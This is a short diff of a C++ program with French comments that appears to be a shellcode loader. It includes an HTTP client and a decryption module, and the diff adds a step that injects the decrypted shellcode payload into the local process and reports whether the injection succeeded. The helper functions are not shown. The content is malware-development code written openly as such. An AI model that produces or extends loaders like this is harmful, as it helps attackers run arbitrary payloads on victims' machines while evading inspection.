@@ -1,6 +1,6 @@
 #include <iostream> 
 #include "HTTPClient.h" 
-#include "decrypt.h" 
+#include "Decrypt.h" 
 #include "Memory.h" 
 
 int main() {
@@ -43,8 +43,18 @@ int main() {
     std::cout << std::endl;
 
     // Fin du déchiffrement du shellcode 
-    
+
+     // Etape 4 : Injection du shellcode
+    if (!injectShellcodeLocal(payload, payloadSize)) {
+        std::cerr << "Échec de l'injection du shellcode." << std::endl;
+        LocalFree(payload);
+        return 1;
+    }
+
+    std::cout << "Injection réussie !" << std::endl;
+
+    // Fin de l'injection du shellcode
+
     LocalFree(payload);
     return 0;
-
 }
